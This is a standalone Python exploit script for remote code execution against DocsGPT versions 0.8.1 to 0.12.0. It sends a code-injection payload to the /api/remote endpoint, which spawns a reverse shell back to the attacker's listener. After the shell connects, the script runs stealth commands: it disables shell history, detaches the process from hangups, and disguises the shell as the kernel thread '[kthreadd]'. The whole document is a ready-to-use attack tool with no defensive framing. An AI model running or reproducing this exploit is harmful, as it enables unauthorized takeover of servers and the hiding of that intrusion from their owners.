import requests
import argparse
import socket
import threading
import sys
import time
import os
from rich.console import Console

# defaults
defaultTarget = "https://target.com:7091"
defaultLhost = "127.0.0.1"
defaultLport = "7091"

# python3 DocsRCE.py -t <target-url> -l <lhost> -p <lport>
parser = argparse.ArgumentParser(description="DocsGPT 0.8.1-0.12.0")
parser.add_argument("-t", "--target", required=False, default=defaultTarget, help="URL")
parser.add_argument("-l", "--lhost", required=False, default=defaultLhost, help="LHOST")
parser.add_argument("-p", "--lport", required=False, default=defaultLport, help="LPORT")
args = parser.parse_args()

TARGET = args.target
LHOST = args.lhost
LPORT = int(args.lport)

# payload
payload = (
    f'user=1&source=reddit&name=other&data={{"source":"reddit",'
    f'"client_id":"9123","client_secret":1738,"user_agent":"482",'
    f'"search_queries":[""],"number_posts":12,'
    f'"backend\\\\":__import__(\'os\').system(\'python -c \\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{LHOST}\\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"sh\\")\\\' %26\')}}#":11}}'
)
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# listen
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('0.0.0.0', LPORT))
server_socket.listen(1)

# send to target
console = Console()
try:
    response = requests.post(f"{TARGET}/api/remote", headers=headers, data=payload)
    print()
    console.print("="*75, style="red3")
    console.print("""
    ▓█████▄  ▒█████   ▄████▄    ██████     ██▀███   ▄████▄  ▓█████
    ▒██▀ ██▌▒██▒  ██▒▒██▀ ▀█  ▒██    ▒    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
    ░██   █▌▒██░  ██▒▒▓█    ▄ ░ ▓██▄      ▓██ ░▄█ ▒▒▓█    ▄ ▒███
    ░▓█▄   ▌▒██   ██░▒▓▓▄ ▄██▒  ▒   ██▒   ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
    ░▒████▓ ░ ████▓▒░▒ ▓███▀ ░▒██████▒▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
    ░ ▒  ▒   ░ ▒ ▒░   ░  ▒   ░ ░▒  ░ ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
    ░ ░  ░ ░ ░ ░ ▒  ░        ░  ░  ░       ░░   ░ ░           ░
    ░        ░ ░  ░ ░            ░        ░     ░ ░         ░  ░
    ░               ░                             ░
    """, style="red1")
    console.print("="*75, style="red3")
    console.print("good luck", style="dim red")
    console.print(f"\n[+] LISTENING: 0.0.0.0:{LPORT}", style="steel_blue")
    console.print(f"[+] TARGET: {TARGET}", style="steel_blue", highlight=False)
    console.print(f"\n[+] Status: {response.status_code}", style="grey66")
    console.print("[+] Response:\n", style="grey54")
    console.print(response.text, style="grey58", highlight=False)
except Exception as e:
    console.print(f"[-] Error sending request: {e}", style="red")
    server_socket.close()
    sys.exit(1)

try:
    client_socket, client_address = server_socket.accept()
    console.print(f"\n[+] ESTABLISHED: {client_address}", style="spring_green2")
    console.print("\ngo forth and be merry\n", style="red3")

    # preset commands
    unset_histfile_command = "unset HISTFILE && export HISTFILE=/dev/null && export HISTFILESIZE=0\n"
    client_socket.sendall(unset_histfile_command.encode())
    time.sleep(1)
    protect_proc_command = 'ulimit -c 0; set +m; nice -n 19 ionice -c3 -p $$ & trap \'\' HUP\n'
    client_socket.sendall(protect_proc_command.encode())
    time.sleep(0.5)
    rename_cmd = 'bash -c "exec -a "[kthreadd]" bash -i"\n'
    client_socket.sendall(rename_cmd.encode())
    time.sleep(1)
    console.print("[+] shh ...\n", style="grey35")

    # i/o
    def handle_recv():
        while True:
            try:
                data = client_socket.recv(4096)
                if len(data) == 0:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            except Exception:
                break

    def handle_send():
        while True:
            try:
                data = sys.stdin.buffer.readline()
                if len(data) == 0:
                    break
                client_socket.sendall(data)
            except Exception:
                break

    recv_thread = threading.Thread(target=handle_recv)
    send_thread = threading.Thread(target=handle_send)
    recv_thread.start()
    send_thread.start()
    recv_thread.join()
    send_thread.join()
except KeyboardInterrupt:
    print()
    kill_process_command = 'kill $$\n'
    client_socket.sendall(kill_process_command.encode())
    time.sleep(1)
    console.print("\n[*] sniped", style="dark_red")
    os._exit(0)
finally:
    try:
        client_socket.close()
    except:
        pass
    server_socket.close()